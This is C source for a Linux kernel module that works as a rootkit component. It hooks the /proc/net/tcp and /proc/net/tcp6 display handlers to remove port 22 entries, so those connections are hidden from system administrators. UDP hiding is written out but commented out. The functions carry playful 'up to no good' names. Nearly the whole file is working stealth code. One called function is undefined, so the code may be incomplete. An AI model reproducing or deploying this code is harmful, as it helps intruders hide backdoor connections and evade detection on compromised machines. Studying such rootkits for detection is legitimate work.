#include "common.h"
#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

#define TMPSZ 150
#define MYPORT 22

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

struct s_port_args {
    unsigned short port;
};


struct s_args {
    unsigned short cmd;
    void *ptr;
};

struct hidden_port {
    unsigned short port;
    struct list_head list;
};

LIST_HEAD(hidden_tcp4_ports);
LIST_HEAD(hidden_tcp6_ports);
LIST_HEAD(hidden_udp4_ports);
LIST_HEAD(hidden_udp6_ports);


void *get_tcp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct tcp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;
	/*http://blog.csdn.net/shanshanpt/article/details/38943731*/
    afinfo = PDE(filep->f_dentry->d_inode)->data;
	/*http://blog.chinaunix.net/uid-28253945-id-3382865.html*/
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void *get_udp_seq_show ( const char *path )
{
    void *ret;
    struct file *filep;
    struct udp_seq_afinfo *afinfo;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    afinfo = PDE(filep->f_dentry->d_inode)->data;
    ret = afinfo->seq_ops.show;

    filp_close(filep, 0);

    return ret;
}

void hide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp4_ports);
}

void unhide_tcp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_tcp6_ports);
}

void unhide_tcp6_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

void hide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->port = port;

    list_add(&hp->list, &hidden_udp4_ports);
}

void unhide_udp4_port ( unsigned short port )
{
    struct hidden_port *hp;

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        if ( port == hp->port )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret = 0;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp4_seq_show);
    ret = tcp4_seq_show(seq, v);
    hijack_resume(tcp4_seq_show);

    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(tcp6_seq_show);
    ret = tcp6_seq_show(seq, v);
    hijack_resume(tcp6_seq_show);

    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp4_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp4_seq_show);
    ret = udp4_seq_show(seq, v);
    hijack_resume(udp4_seq_show);

    list_for_each_entry ( hp, &hidden_udp4_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int n_udp6_seq_show ( struct seq_file *seq, void *v )
{
    int ret;
    char port[12];
    struct hidden_port *hp;

    hijack_pause(udp6_seq_show);
    ret = udp6_seq_show(seq, v);
    hijack_resume(udp6_seq_show);

    list_for_each_entry ( hp, &hidden_udp6_ports, list )
    {
        sprintf(port, ":%04X", hp->port);

        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
        {
            seq->count -= TMPSZ;
            break;
        }
    }

    return ret;
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{

    /* Hook /proc/net/tcp for hiding tcp4 connections */
    tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
    hijack_start(tcp4_seq_show, &n_tcp4_seq_show);
	hide_tcp4_port(MYPORT);

    /* Hook /proc/net/tcp6 for hiding tcp6 connections */
    tcp6_seq_show = get_tcp_seq_show("/proc/net/tcp6");
	hijack_start(tcp6_seq_show, &n_tcp6_seq_show);
	hide_tcp6_port(MYPORT);

    /* Hook /proc/net/udp for hiding udp4 connections */
	//udp4_seq_show = get_udp_seq_show("/proc/net/udp");
    //hijack_start(udp4_seq_show, &n_udp4_seq_show);
	//hide_udp4_port(MYPORT);
	
    /* Hook /proc/net/udp6 for hiding udp4 connections */
   // udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
   // hijack_start(udp6_seq_show, &n_udp6_seq_show);
   //hide_udp6_port(MYPORT);

    return 0;
}

static void __exit mischief_managed ( void )
{

    hijack_stop(udp6_seq_show);
    hijack_stop(udp4_seq_show);
    hijack_stop(tcp6_seq_show);
    hijack_stop(tcp4_seq_show);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
